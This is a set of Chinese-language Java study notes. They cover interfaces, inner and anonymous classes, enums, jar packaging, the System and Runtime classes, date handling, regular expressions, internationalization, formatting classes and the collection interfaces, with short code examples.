接口可用于定义引用变量，但是不能用于创建实例（接口定义的引用变量可以引用它的子类对象，这时就相当于向上造型，当然，进行向上造型后获得的接口定义引用变量，可以对其进行强制类型转换，变为实现类的类型，然后调用实现类中的所有成员方法）。接口里面不能有main方法子类的，也就是说，接口里面的任何方法都必须借助实现了接口的类的对象来调用，而不能通过接口调用，因为接口极其抽象，无实体。接口里的方法不能是static。

接口最大的用处就是供其他类来实现：implements。就是使得这个类具有接口所代表的功能。注：一个类可以同时实现n个接口。可以弥补java单继承的不足，相当于模拟了多继承。当实现类中实现了接口之后，就会获得接口中所有的抽象方法。由于接口中所有的方法都是抽象的，所以实现类中要么为所有的这些抽象方法提供实现，要么这个实现类继续做抽象类。

接口主要是在面向接口编程的时候有用。

注意：类实现接口时，由于接口中的方法默认的权限是public，而implements的要求被实现后的方法的权限比原来接口中的方法权限更大，所以，在类中实现接口中的方法的时候，该方法的权限必须加上public，否则就是空，空权限小于public，不符合implements的要求。

注：在方法的调用中，编译时类型由引用变量类型决定，运行时类型是由引用变量引用的对象决定。在调用一个方法的时候，首先要保证编译能通过，那么就要保证这个被调用的方法是引用变量类型的成员方法（即使是抽象方法亦可）。
然后到了运行的时候，再根据引用变量所引用的对象类型来决定该引用哪一个成员方法（是父类的方法还是子类重写的方法？）。
接口与抽象类之间的共同点与区别
二者都可以保护抽象方法。
都不能创建实例。
子类继承抽象类、实现接口时，都要求实现所有的抽象方法，否则子类也只能是抽象类。
接口里面只能有抽象方法（默认即是如此），抽象类里面可以没有抽象方法。
接口里面没有静态方法（因为是默认abstract的，所以不能有static的）。但抽象类里面可以有静态方法。
接口里的field都是public static final；但抽象类中是普通的。
接口无初始化块，抽象类中可以有。
接口中无构造器，抽象类中可以有。
接口可以n个父接口，抽象类只能有一个父类。


Java中的内部类、内部接口、枚举
----------------------
枚举：一种实例数固定的特定类。
Eg：
性别这个类，只有两个实例。
行星这个类，只有八个实例。
这些类，不同于一般的类，他们的实例数只有已知的那么几个。

内部类：把一个类在另一个类里面进行定义。
所谓的内部类，就是表面外部这个类具有内部类这个东西。内部类不是表示外部类的某个属性的。而是表示外部类本身所具有的具体的零件，是具体实体的一部分。
例如：
牛具有一项属性：名字，那么bull这个类具有一个属性name，那么程序语言的表示上就是：has a的关系，也就是说bull类有一个field是String字符串。这是表示某个类的属性的表示方法，作为一个field表示。
但是如果是牛具有某一个零件，如，牛具有角，那么这个角对于牛这个类来说就不能如牛的名字哪样表示成一个内部拥有的属性了。而是应表示成牛这个类的内部属性。


要注意：外部类不能用private修饰，也不能被protected修饰。因为在外部类本身之外并无外部类（这个外部类只是属于包）。所以这两个修饰符并无意义。也不能使用static修饰，不属于某个类。
但是，对于内部类而言，其处于外部类的里面，所以对于内部类而已，private、protected这些修饰符是有意义的，所以其修饰符可以是这个三种中任何一个。也可以使用static修饰。有static修饰的内部类属于外部类本身。否则是属于实例。

内部类上一级程序单元是外部类，外部类上一级程序单元是包。
Java中，每一个类是一个文件，然后很多类编译出来的结果放在一起组成一个包。

内部类的定义和普通类是一样的。内部类可以直接使用（需要加上外部类名.this<当外部类非static>或者外部类名.<当外部类是static>引用）外部类的属性、方法、构造器等，无论是private还是别的。
同样，外部类的方法也可以使用内部类，也就是在外部类的方法中创建内部类的实例。通过这个内部类对象引用变量来调用内部类自己的方法。
但是外部类不能直接使用内部类的成员（属性、方法等），而只能通过创建内部类对象来使用这个内部类的成员（属性、方法等）。不能直接使用。
实际上，将内部类视为寄生类，将外部类视为宿主类，更容易理解。

注：编译之后，内部类的文件编译而成的class文件名变为外部类$内部类.class。

调用原则：
内部类本质是寄生类。
没有static修饰的内部类，寄生在外部类的实例里面。
所以在外部类的方法中创建内部类的实例时，实际上是使用：new this.mouth(),
当然实际上在外部类方法中创建内部类的实例时，使用的是：new mouth()这样的写法。那么外部类的static方法等就不能访问static内部类。
有static修饰的内部类，是寄生在外部类的类里面。如果，内部类是static修饰的，那么，外部类的static成员方法就可以直接使用static内部类了，而且这个static内部类是属于整个外部类的，所以不用通过外部类实例调用外部类方法，不用在外部类的方法中来创建内部类实例。当然这个static的内部类也不能访问非static的外部类成员。

内部类的使用：
内部类优点：提供更好的封装性。将外部类的零件直接封装起来，可以让外部完全对其义务所值。
在外部类里面使用内部类和使用内部类是同样的，没有特殊。
在内部类外面使用内部类时，分为static内部类和非static内部类两种情况。
在外部类之外使用非static内部类时，使用外部类.内部类+变量名声明内部类的引用变量。
Eg：outer.inner in;//这就是创建了一个内部类引用变量。

创建内部类实例对象的时候，要先创建外部类对象，然后再创建内部类的实例。
Eg：
Outer ot；//先创建一个外部类引用变量。
Ot.new inner(); 	//使用这个外部类引用变量来创建一个内部类的实例对象。

如果某一个类是继承了内部类，那么该怎样使用内部类？
寄生类的子类也是寄生类。它也需要一个宿主。
>
	Class innerSub extends outer.inner
	{
	   //内部类的子类的构造函数就是与众不同的。因为子类必须要调用父类的构造函数一次，所以这个调用就是一个问题。
		Public Innersub()
		{
			New outer().super();//对于这个子类而言会自动调用父类的构造器，但是我们知道其父类的构造器必须通过父类的对象来调用，而不能直接调用，所以要先创建一个父类的对象。    
		}
		Public innersub(outer out)
		{
			Out.super();
		}//父类是一个非static内部类，所以子类自动调用父类的构造器的时候，需要使用父类的寄主对象来调用父类的构造器。所以这里可以传入一个out寄主对象。
	}


B、在外部类之外使用static内部类的时候。
他可以直接通过外部类来进行调用，而不用像非static内部类那样创建宿主类对象来使用内部类。只有用到外部类，内部类就有了，因为内部类就是属于外部类的，而不是属于外部类对象。不需要程序员去关注宿主，因为他的宿主是天然就有的。

子类继承Static内部类的时候，寄主天生就有，就是外部类本身。使用的时候，可以将外部类当成内部类的一个包即可。
>
	Class innerSub extends outer.inner
	{
	   //内部类的子类的构造函数就是与众不同的。因为子类必须要调用父类的构造函数一次，所以这个调用就是一个问题。
		Public Innersub()
		{
			New outer().super();//对于这个子类而言会自动调用父类的构造器，但是我   们知道其父类的构造器必须通过父类的对象来调用，而不能直接调用，所以要先创建一个父类的对象。    
		}
		//或者：
		Public innersub(outer out)
		{
			Out.super();
		}//父类是一个非static内部类，所以子类自动调用父类的构造器的时候，需要使用父类的寄主对象来调用父类的构造器。所以这里可以传入一个out寄主对象。
	}


局部内部类：用得不多。因为意义不大（因为局部内部类的作用域太有限了，仅在方法里面有效，也导致使用比较简单）。了解一些即可。
局部内部类的作用就是：当我们在任何一个方法中某个地方时，需要使用一个新的类的时候，如，实现一个接口或者继承一个类的时候，这个时候就要临时创建一个类，这时候不必再在外面创建类，太麻烦，可以在这个地方现场创建一个类，实现接口或者继承其他的类。这样就是局部内部类的作用。当然，内部匿名类也是这个作用。
>
	Public int f（）
	{	
		Class pro 
		{
			……
		}
		//或者
		Class pro implements per
		{
			……
		}
	}


局部内部类的内容和普通类都是一样的。

局部内部类可以同名的，如，在不同的方法中，可以定义相同的内部类。
所以，局部内部类的class文件名为（每一个类都有一个文件，当然包括，内部类、局部内部类这些）：外部类+n（表示是外部类中第几个局部内部类）+局部内部类.class。以代表多个重名的局部内部类。


匿名内部类：适合于创建只需要一次使用的类。没有名字的类。
所以，程序以后无法再次访问这个匿名内部类。
当程序在创建这个匿名内部类的时候，会立即创建这个匿名内部类的实例。

实际上在一个地方要使用一个新的类对象的时候，与其使用局部内部类，还不如使用匿名内部类，更加方便，且效果好。
语法格式：
>
	new 父类接口（）|父类构造器//这个新的匿名内部类可以是实现父类接口
					  //或者继承其他类，都可以，只是用一种随要随造					 //的方式予以实现，无名。但是方便。
	{
		//类体部分
	}

以上的语法格式返回了匿名内部类的实例对象。以后就只能使用这一个创建的实例对象。
>
	interface walkable
	{
    	void walk();
	}
	public class 
	{
		public static void main(String[] args)
		{
			walkable w=new walkable()
			{
			int a=10;//这里的匿名内部类的意思就是：walkable与{}共同构成对walkable这个			 //接口的重载，然后加上new就创建了一个实现类的实例对象。再进行向上转		 //型,被接口定义的变量所引用。实际上单纯的接口是不能创建对象的。但			 //是，如果匿名内部类实现了这个接口，就可以用这个匿名内内部类创建实例		 //对象了。所以这里做了两件事：创建一个接口实现类、用这个接口实现类.
			@Override
			public void walk()
			{
				System.out.println("walk");
			}
			public void f()
			{
				System.out.print("f");
			}
			//实现接口的匿名内部类中可以有field、重写方法、方法、初始化块，但不能有构造
			//器，因为匿名内部类没有名字，没办法写构造器。
			/*
			 * 以上代码相当于：
			 * class walker implenments walkable
			 * {
			 *		int a=10;
			 *		@override
			 *		public void walk()
			 *		{
			 *			system.out.println("walk");
			 *		}
			 *
			 *		public void f()
			 *		{
			 *			System.out.print("f");
			 *		}
			 *	}
			 *
			 *	walkable w=new walker();
			 * /
		}；//注意匿名内部类这里有一“；”
	}
	}


就是说，原来实现一个接口，然后用这个实现类来创建一个类对象的工作可以通过匿名内部类的方法予以完成，在任何地方，随要随做，无需名称，很快完成。



匿名内部类规则：

1. 匿名内部类只能继承一个已有的类或者实现一个接口（而不能和普通的实现类那样实现多个接口）。
2. 匿名内部类必须实现接口或者父类的所有抽象方法，因为，匿名内部类不能是抽象的。因为创建这个匿名内部类之后就需要立刻创建实例。
匿名内部类没有构造器，因为没有类名，但是可以有初始化块。

本质上来看：类、枚举、接口都是同一级的概念。  
抽象性：类<内部类<接口。  

#Java中的枚举
-------
枚举：用于代表实例数量是固定的**特殊类**。有点像单例类，只不过**有多个实例**。枚举非常重要。  
语法示例如下：
>
	[修饰符] enum 枚举名
	{
		//必须在第一行立即写上该枚举的所有实例对象名。这里写上实例，表面上看是写出实例对象名，实际上是在调用构造器进行初始化。所以，如果本枚举类拥有无参构造器，那么直接写对象名就是调用默认构造器。但是，如果没有无参构造器，就需要使用有参构造器，就不仅仅是直接写对象名就行，还得显式调用有参构造器。
		//其他部分和普通类是同样的。同样可以有field、构造器（必须是private构造器，默认的就是private的，大部分时候不用写）、方法、内部类\内部枚举\内部接口等东西。其本质就是一个类。
	}
>
	public enum Gender
	{	
    	Male,//这是调用了该类的默认构造器，省略了括号。
		Female("woman");//显式调用有参构造器。实际上相当于：Gender Female=new Gender("woman")；
		String name;
		Gender()//默认构造器
		{
			name="man";
		}
		Gender(String agender)//有参构造器
		{
			name=agender;
		}
	}

`enum`关键字的地位与`class`这个关键字的地位是一样的。  

修饰符：`public|省略` 或者 `abstract|final`（但是二者必须出现其中之一。默认的是`final`）。  

枚举类的特征：  
默认继承了`Java`自己的枚举类，实际上还继承了`object`类。由于所有的枚举都继承自一个`Java`中的枚举，就和普通类都继承自`object`类一样，都继承了某一些方法。  
例如：所有的枚举都有`values()`方法，这个方法可以返回所有的枚举值。
  
枚举类的构造器只能用`private`来修饰，因为不能再类外随意创建实例，实例数已经固定了。这样是为了保护构造器。  
使用枚举类的实例对象的时候，直接用即可，不能再去`new`创建。
  
枚举类的方法要非常小心。这里的主要问题是：  
枚举类是特殊的类，因为它的类对象在设计类的时候就已经设定了，而且相应类对象的各个属性也已经设定了(构造类对象的时候)。所以就不能在类中方法里面随意设定属性的值。  
也就是说，在`set()`这种方法里面，设置某些属性的值的时候，在这些方法中一定要进行所要设定目标值的合理性的检验，否则就会导致违背类自己限定的对象的实际情况。或者直接不允许出现设定对象属性的方法。  
包含抽象方法的枚举类，如果某个方法有`abstract`修饰，那么就不能有`final`和`static`。  

更重要的是，当枚举类具有抽象方法的时候，那么这个枚举类就是一个抽象类，那么，这个抽象内部类怎么能够有实例对象呢？
`Answer`：对于一个抽象类而言，不能通过调用它的构造器来创造它的对象，这个时候，如果真需要使用抽象类的对象，可以通过匿名内部类来进行。
>
	abstract class mt
	{
		int f=10;
		public abstract void fo();
		public void fm()
		{
			System.out.println("abs");
		}
	}	
>
	public class abs 
	{
		public static void main(String[] args)
		{
			System.out.println("hello world");
			mt m=new mt()//这里通过一个匿名内部类来创建一个抽象类的对象。
			{
				public void fo()
				{
					System.out.println("fo");
				}
			};
			m.fm();
		}
	}

`Answer`：这时候可以使用匿名内部类，使用匿名内部类来创建包含抽象方法的枚举类的对象。这个匿名内部类继承的就是这个包含抽象方法的枚举类（需要实现枚举类中的`abstract`方法）。因为要创建这个枚举类的对象，所以就可以先创建继承本枚举类的子类，然后通过这个子类创建枚举类的对象。然后就可以随意使用我们创建的这些对象了。
>
	public enum seasons
	{
		spring()//这里就是一个匿名内部类，继承了枚举类。然后通过这个匿名内部类创建了一个对象。因为不能通过调用枚举类的构造器来初始化创建枚举类的对象，所以只能使用匿名内部类。这样可以避免抽象枚举类无法通过构造器构建对象的缺陷。
		{
			public void infor()
			{
				System.out.println("spring");
			}
		},//注意，这里的枚举中的匿名内部类后面使用的是“,”而不是在类中写匿名内部类时所使用的“;”。也就是说这里的分隔符用什么决定于这个创建的对象后面本来该用什么分割符。
		summer()
		{
			public void infor()
			{
				System.out.println("summer");
			}
		},
		autumn()
		{
			public void infor()
			{
				System.out.println("autumn");
			}
		},
		winter()
		{
			public void infor()
			{
				System.out.println("winter");
			}
		};
>	
		public abstract void infor();
>	
		public static void main(String[] args)
		{
			System.out.println("hello world");
>
			seasons.spring.infor();
			seasons.summer.infor();
			seasons.autumn.infor();
			seasons.winter.infor();
		}
	}

枚举是一个特殊类：实例数固定，且必须在类第一行就写出来。

枚举类也可以实现接口：  
1. 我们可以在枚举类里面实现接口中所有的抽象方法。  
这样可以保证枚举类不是`abstract`类，可以创建实例，然后其他的和一般的枚举类都是一样的。  
2. 我们不在枚举中实现接口中的所有的抽象方法。  
这样枚举类就是`abstract`类，然后就可以使用匿名内部类创建枚举类的对象。

枚举用于描述我们*已知一个类中的对象有那么几个的时候*，如，成绩分等级时几个等级都已知，季节中就呢么几个，性别只有那么几个。我们已知对象的具体情况的时候，无需创造无数的对象。

注：选择语句`switch`的表达式必须是以下几种之一。
>
	switch(byte|short|char|int|String|枚举);//只有这六种，如、double等都是不行的。


#Java中的jar命令
---------------
作用：把多个文件打包成一个压缩包。与`winzip`压缩格式是一样的，只不过jar压缩结果中在各种`class`文件之外会添加一个`meta-inf`的文件夹，其中有一个`menifest.mf`文件，这个文件就是清单文件。  

通常得到的压缩包有3种:  
1. `*.jar`:它里面包括的是n个`class`文件。  
2. `*.war`:它是一个`web`应用打包生成的文件。与`jar`的格式是一样的，只是后缀不同而已。  
3. `*.ea`r:它是一个企业应用打包生成的包。

`jar`命令的用法：
某个工程在一个文件夹中，里面都是`class`文件。将所有的`class`文件压缩成一个`jar`文件压缩包。  
> 
 `jar -cvf myname.jar *.class `  //f:表示后面的是目标`jar`文件名。`*.class`表示将文件夹所有的`class`文件都压缩起来。

如果不生成清单文件：
>
>
	jar -cMf myname.jar *.class

查看`jar`压缩包的内容：
>
	jar -tf myname.jar
	jar -tvf myname.jar:查看详细内容

解压：
>
	jar -xf myname.jar:将jar压缩包解压。

更新压缩包：将新class添加到原来的jar包中。
>
	jar -uvf myname.jar *.class //将文件夹中的新的class加入到原来的jar包中。


为什么做jar包？  
因为一个真实项目中会有很多`class`文件，所以存在系统管理不方便、性能低（`jvm`需要依次加载不同的`class`文件，效率很低）。  
所以可以将多个`class`文件打包成一个`jar`包，这样的好处就是：多个`class`文件统一成一个`jar`包方便管理，`jvm`不用将`jar`包解压再加载，而是可以加载整个`jar`包（加载所有的`class`），这样效率高。


将整个项目打包成可执行的`jar`包：  
我们将所有的`class`打包成`jar`文件后，这些`class`中只有一个`class`中的`main`方法才可以执行，也就是说项目是从这个`class`文件开始执行的，但是`jvm`不知道哪一个才是可以开始执行的`class`文件，所以，需要打包成可执行的`jar`包。
通过`-e`选项告诉`jvm`哪一个`class`才是整个项目的主类。
>
	jar -cvfe myname.jar hello *.class//后面的说明hello.class是主类，*.class表示压缩文件的来源为目录下所有的class文件。
产生的文件在已经装了JVM的情况下可以点击运行。  
如果没有安装JVM，可以使用：
>
	java -jar my.jar来进行运行。//用于运行控制台程序。
	javaw -jar my.jar//这是用于运行界面程序。


Java中的入口方法
------------------------
系统`JVM`在调用这个`main()`方法的时候，`JVM`与我们的类不会在同一个包中，`JVM`也不会是我们这个类的子类。所以只能用`public`修饰`main()`方法。  
也不能先创建实例来调用`main()`方法，只能用类拥有的方法，这样在`JVM`载入这个类的时候，就自动加载这个类所拥有的方法。所以`main()`方法就是一个`static`方法。  
`main()`方法的参数：`args`，这是一个`String`数组，默认长度是0；可以在运行的时候，接参数，将参数值传递进入`main()`方法。  
>
`java 主类名 参数1 参数2 参数3……`


Java中与系统有关的两个类
-------------

System类  
代表我们的`JVM`所在的操作系统，如`XP`系统。  
如果要获取操作平台的相关特性，就要使用`System`类。  
`System`类中所有的方法和`field`都是`static`的。无需对象来调用。
>
`System.out`:代表屏幕这个对象，这个`out`实际上是`System`这个类的一个`static field`，属于整个类。因为系统本来就有这个东西，而且是类拥有的。  
>
`System.in`:代表键盘这个对象，这个`in`实际上是`System`这个类的一个`static field`，属于整个类。
>
`System.exit(int status)`:使用这个`static`方法可以退出JVM，这个方法实际上是`System`这个类的一个`static`方法。遇到这个代码，该`java`程序立刻结束,退出虚拟机。
>
`System.getenv()`:获取所有环境变量。
>
`System.getenv(String name)`:获取指定环境变量值。
>
`System.getProperties()`:获取所有的系统属性。
>
`System.getProperty(String key)`：获取指定的系统属性。  

Runtime类  
代表`JVM`所在的`JRE`。  
`JRE=JVM+核心类库（JDK）`。  
若要获取`JVM（虚拟机）`的特性，就要使用`Runtime`类。

`Runtime`类的方法不是`static`的，而且这个类没有构造器。  
但是这是一个单例类。它的构造器被隐藏了，外界是看不到的。  
只能通过`getRuntime()`这个`static`方法来获得实例。然后通过这个实例来调用`Runtime`的各种方法进行操作。
>
	Runtime rt=Runtime.getRuntime();//获得runtime类的实例
	System.out.println(rt.availableProcessors());//使用这个实例调用这个类的方法，获得JVM的处理器个数

还可以通过`Runtime`类对象的方法`exex()`来调用运行操作系统（xp）命令或者其中的一个程序：
实际上只要是安装于这个系统中的所有软件都可以通过这个类对象进行调用运行。
>
	rt.exec("D:/Program Files/Bin/QQ.exe");//在虚拟机中开辟一个新的进程，然后再执行用系统中的某一个程序。注意调用时的路径问题，如果没有指定绝对路径，而只有相对路径，就回到path环境变量中进行搜索。

因此，有了这个东西，我们可以做一个有界面的程序，界面上都是本系统中拥有的所有程序的图标按钮，然后每一个按钮都和对应的程序.exe连接在一起，那么运行了这个程序之后，点击相应的按钮就可以快捷启动对应的软件。

Java中用于处理日期的类
----------
`Date`类，表示一个日期。  
其未过时的构造器只有：
`Date()与Date(long date)`，当然，过时的方法等都还是可以使用。  
在Java中月份从0开始。`Date`是毫秒数，从1970开始。  
`System`类中有一个`static`方法`currentTimeMillis()`用于获取当前时间已经过的毫秒数。
>
	//initialize the de with default empty constructor_
	Date de=new Date();
	System.out.println(de);
>		
	//get the currentTimeMillis from 1970
	System.out.println(System.currentTimeMillis());
>
	//initialize the de with default empty constructor_
	de=new Date(System.currentTimeMillis()-3*24*60*60*1000);
	System.out.println(de);//output the date three days earlier

`Calender`类，也表示一个时间。  
由于`Date`类已经过时了，所以要使用`Calender`类来代替。但是`Date`类并不能完全丢弃。  
但是`Calender`的构造器不能被调用。所以不能自己调用该类的构造器去创建对象实例。
而是通过其一个`static`方法去创建一个实例。这个方法是`getInstance()`。
>
	//output the static field of clendar
	System.out.println(Calendar.DAY_OF_MONTH);
>	
	//get the object of calendar class
	Calendar cal=Calendar.getInstance();
	System.out.println(cal.getTime());
>		
	//set the time field
	cal.set(Calendar.MONTH,10);
	System.out.println(cal.getTime());
>
	//add the value to the field without the limits
	cal.add(Calendar.MONTH,12);
	System.out.println(cal.getTime());
>						
	//add the value to the field with the limits
	cal.roll(Calendar.MONTH,12);
	System.out.println(cal.getTime());


Java中的正则表达式
---------
所谓的正则表达式就是：可以匹配n个字符串的字符串模板。是一个非常强大的字符串模板。  
>
	`*代表n个字符`  
	`？代表一个字符`  
一般在命令行中，经常使用此类的符号来搜索。但是功能太弱。所以需要正则表达式。是跨语言工具。

注：vim编辑器对正则表达式支持很好。“/”+正则表达式。

A、正则表达式支持的通配符有：
>
	“.” :匹配一个任意字符。
	“\s”:space,匹配一个任意的空白、tab。
	“\S”:space,匹配一个任意的非空白、tab。
	“\d”:匹配任意一个数字。Digital。
	“\D”:匹配任意一个非数字。
	“\w”:匹配一个单词字符。
	“\W”:匹配一个非单词字符。

注：实际写程序中，由于需要转义，所以在代码中，”\”应该写为“\\”。

Java中的正则表达式也不是足够强大。  
Java中正则表达式：`regular expression`：`regex包`。
有两个正则表达式的工具类：`Pattern`类与`Matcher`类。

注意：正则表达式本身就是一个`String`对象。

`String`类中与正则表达式有关的几个方法：
>
`Match(String regex)`：用于判断`String`对象是否匹配后面的`regex`模板。
>
	String str="1a3s";
	System.out.println(str.matches("\\d\\w\\d\\S"));//匹配。编程的时候使用转义字符，\\表示\。  
`replaceAll(char a, char b)`：替换。
>
	System.out.println(str.replaceAll("a","b"));
`Split(String regex);`//按照通配符的位置所在进行切开。

B、正则表达式中的方括号表达式：  
这里的方括号表达式，整个方括号表示一个字符。  
1. 枚举：[abc]：表示“a”“b”“c”三个字符中的任意一个字符。  
2. 范围：[a-f]：表示a-f这个范围内的任意一个字符。  
3. 枚举与范围共存：[a-f123]:表示a-f这个范围、1、2、3这些字符中任意一个字符。  
4. 求否：[^a-f]：表示不是a-f这个范围内的任意一个字符。或者，[^abc]:表示不是a、b、c中任意一个字符。  
5. 求交：[a-g&&[^b-c]]:表示a-g范围与非b-c范围的交集中的任意一个字符。  
6. ()：表示括号里面任意一个字符串：（sd|fg|er）：表示这个三个字符串中任意一种。

C、正则表达式中的特殊字符：
>
	()、[]、{}、\、？、*、+、^、$
对于这些特殊字符，如果在正则表达式中表示它们的本义也就是字面意思，就要对他们使用转义字符。
>
	^表示一行的开头
	$表示一行的结尾

D、正则表达式中表示出现次数的副词：作用是用于修饰出现在其前面的通配符。
>
	？：表示？前面的东西可以出现0-1次。  
	* ：表示*前面的东西可以出现n次。
>
	\d?:出现一个数字
	\w*:出现n个字母
	.*:出现n个字符
>
	+：表示+前面的东西可以出现1-n次。
	{m，n}：表示前面的东西可以出现m-n次
	{，n}：最多n次
	{m，}：最少m次
	{x}：表示出现x次

注：正则表达式中，直接写数字，表示没有使用通配符。  
所谓的正则表达式就是用一个个的符号对一个`String`对象的每一位进行限制规定，以达到对各位分别进行适配的目的。

`Pattern`类的使用。
`Pattern`类对象实际上就是代表了一个**正则表达式**。它们就是同一个东西。  
没有构造方法，需要通过一个static方法创建一个pattern类对象。
>
	Pattern pa=Pattern.compile(“\\w”);//创建了一个pattern类对象。  
以后就可以使用这个`pa`对象来代替`\\w`这个正则表达式了。

Matcher类：表示一个匹配工具类。
有用的Matcher类方法:
>
	Find()；
	Group()；

如果想正则表达式具有更复杂的功能，那就需要用到这两个类。其他时候不必使用，一般的匹配符即可完成。  
例如：实现特定字符串搜索提取的功能时可以使用这两个类。  
如：
>
创建一个网络爬虫，其功能就是：从任何一个网站开始，通过提取出这个网站上的所有超链接，获得其他网站的入口，这就是网络爬虫的作用。  
爬虫工作步骤：
1. 向指定网页发送请求（申请访问网页）。  
2. 获取该网页的响应内容（就是网站将网页的内容发送过来）。  
3. 提取出网页内容中的超链接地址。此步骤中使用正则表达式，使用这两个类的作用。

Java中的国际化
--------------
所谓的java的国际化，就是希望程序本身自适应所有的用户（各种语言界面）环境。就是`I18N`。

其本质就是：查找&&替换。  
就是对程序中出现的字符或者字符串到资源文件中进行查找替换成目标的字符或者字符串。

资源文件：用于为程序提供国际化消息。  
资源文件的命名：`<baseName>_语言代码_国家代码.properties `  
如：
>
Ms_zh_CN.properties

同一个程序的所有资源文件的`baseName`必须是相同的，也就是说对于不同语言的资源文件命名时，`baseName`都是一样的。
该文件中内容：
>
	hi=你好！

如果资源文件中包含有非西欧字符（中文，日文等），就需要使用native2ascii工具来处理这个文件，然后才能用。
使用这个工具处理资源文件的命令：
>
	native2ascii Ms_zh_CN.properties mse_zh_CN.properties //将前者处理成后者这个文件。就是将汉字处理成标准的Unicode值。


使用ResourceBundle类来加载资源文件。
>
	Locale currentLocale=Locale.getDefault(Locale.Category.FORMAT);//获得当前locale。也就是我的这台计算机所在的区域和使用的语言，以备在下一步中选用所对应的语言资源文件。
>
	ResourceBundle res=ResourceBundle.getBundle(“mse”,currentLocale)；//使用ResourceBundle来加载资源文件。
	System.out.println(res.getString(“hi”));//使用查找替换，将”hi”替换成”你好!”也即是使用资源文件。



国际化中，还有一个问题就是占位符，就是这个字符串暂时未定，只能在语言资源文件中写上一个占位符。

资源文件中：
>
	hi={0}，你好！{1}  //在资源文件中加上占位符，以供运行时参数来填补占位符。
	源程序中：
	System.out.println(MessageFormat.format(res.getString("hi"),args[0],args[1]));//这里使用MessageFormat类，为消息中的占位符填充参数值。

运行这个程序的时候，使用运行时参数args[0],args[1]来填充资源文件中的占位符。

CMD中：
>
	java hell 张三 李四 // 这里在运行的时候，用张三、李四两个字符填充语言资源文件中两个占位符。


国际化的步骤：  
1. 提供资源文件。  
2. 对于非西欧字符，要将它进行处理成标准`Unicode`字符。使用`native2ascii`工具。  
3. 探查获得本计算机所在区域以及所使用的语言。  
4. 使用一个`ResourceBundle`类来绑定我们所需要的语言资源文件，也就是将探测到的计算机所使用的语言与我们已有的语言资源文件链接起来。  
5. 在程序中通过查找替换的形式使用语言资源文件中所对应的语言。


那么怎样查询所需语言和国家代码？
使用`Local`工具类即可。
>
	Locale currentLocale=Locale.getDefault(Locale.Category.DISPLAY);


Java中的Format类的使用
-----------------  
`Format`类有三个子类：`MessageFormat、NumberFormat、DateFormat`。  

`NumberFormat`类：用于格式化数字，所谓格式化数字，就是将数字转换成相应所要求格式的字符串。
不能使用构造器来进行构造，而是使用以下的`static`方法来获得实例对象。
>
	getCurrencyInstance（）；用于将数字格式化成货币字符串。
	getIntegerInstance（）：用于将数字格式化成整数字符串。
	getPercentInstance（）：用于将数字格式化成百分号字符串。

并且，这些方法中还可以传入`locale`对象，设置格式化成哪个国家的字符串。

得到`NumberFormat`类的实例对象之后，调用其以下方法，就可以将数字转换成相应所要的字符串。
>
	String format（double number）；

`DateFormat`类：用于格式化日期。不能直接创建实例，而是通过以下的`static`方法创建实例。
>
	getDateInstance（）；用于将日期对象格式化成日期字符串，只有日期，没有时间。
	getTimeInstance（）；用于将日期对象格式化成时间字符串，只有时间，没有日期。
	getDateTimeInstance（）；用于将日期对象格式化成日期时间字符串，都有。

并且，这些方法中还可以传入`locale`对象，设置格式化成哪个国家的字符串以及格式化风格。
>
	DateFormat  usShort=DateFormat.getDateTimeInstance(DateFormat.SHORT,DateFormat.LONG,Locale.US);

得到`DateFormat`类的实例对象之后，调用对象的以下方法，就可以将日期对象格式化成相应想要的字符串。  
>
	String format（Date date）；
>
	Date date = new Date();//创建一个时间对象实例。
	System.out.println(df.format(date));//将时间对象实例格式化成想要的String格式。


还有一个常用的`simpledateformat`是`Dateformat`的子类。
其可以进行任意自定义格式的格式化，是简单的日期时间格式器。**可以将日期格式化为字符串，也可以将字符串格式化为日期**。其具有构造器。
>
按照自己的要求*将日期对象格式化成一个日期字符串*。
>
	SimpleDateFormat sdf = new SimpleDateFormat("生日：y年M月d日,是今年的第D天");//将格式器设定为我们所需要的任何格式。
	System.out.println(sdf.format(date));//使用格式化器。
>
它的格式化是随心所欲的。
>
将一个*日期字符串格式化成一个日期对象*。
>
	String dat = "2014/5/25 13.34/12";//时间字符串
	SimpleDateFormat sdf1 = new SimpleDateFormat("y/M%d H.m/s");//创建对象
	Date da = sdf1.parse(dat);//将时间字符串转换成时间对象
>		
	System.out.println(da);//输出时间对象。





Java中的容器类
---------
Java中的容器用于装对象。  
那么这些容器中应该有哪些方法？  
1. 装入对象的方法。  
2. 把对象读取出来的方法。读取之后，这个对象依旧在容器当中。  
3. 把指定对象从容器中删除。  
4. 把整个容器清空。  
5. 遍历，将每一个对象都读取一次。  
6. 将A容器中的对象倒入到B容器。  
7. 从A容器中的所有对象中减去B容器中的所有对象。  
8. 容器之间求交集。

容器类的所有方法都是通过实现别的定义了各种方法名的**接口**来达到目的。

这些定义了各种方法名的接口有：  
>
a. `Collection`接口。里面都是各种方法的声明的集合，没有定义方法，因为接口是极其抽象的，**里面都只有抽象方法**。  
>
b. `Set`接口，**其继承自`Collection`接口**，内容基本上和`Collection`一样。使用条件：存放位置无索引，但不是随机的，不允许存放元素重复。（*被集合实现*）。
>  
c. `List`接口，**其也继承自`Collection`接口**。使用条件：存放位置有索引，因此元素可以重复。类似于数组。被线性表实现（*顺序表或者链表*）。
>    
d. `Queue`接口，**也继承自`collection`接口**。使用条件：先进先出。（*被栈、队列实现*）

实现了以上那些接口的类有：  
a. `HashSet`类：实现了`Set`接口的类。`HashSet`无序。其有一个子类：`LinkedHashSet`，这是有序的。  
另，对于`Set`接口而言，其还有一个子接口`SortedSet`，这个接口可用于需要排序的集合（也就是说，一旦一个类实现了这个`SortedSet`，那就具有了排序的功能，这个接口里面的功能就都有了）。`TreeSet`类实现了`SortedSet`这个接口。  

b. `List`是被线性表实现，线性表可以基于顺序表或者链表。
所以，实现`List`接口的有`ArrayList`类（基于顺序表的实现）、`LinkedList`类（基于链表的实现）、`Vector`类（仅作了解，几乎无用了）。

`Vector`类有一个子类`Stack`（仅作了解）。

c. `Queue`，被队列实现，队列是特殊的线性表，也就是在继承线性表类之后加入某些特征（只能先入先出）（进行功能上的削弱）获得队列。  
`Queue`派生了一个子接口`Deque`，这个子接口的使用条件：双端队列，两端都可进可出。也就是可以先进先出，也可以后进先出。  
其本质就是：既是栈也是队列。既有栈的方法也有队列的方法。在java中看上去是没有栈这个东西，但实际上是有的，就是`Deque`。  
`Deque`接口的实现类：  
基于顺序表的实现，`ArrayDeque`类。  
基于链表的实现，`LinkedList`类，这个类既实现了`Deque`又实现了`List`，功能强大。

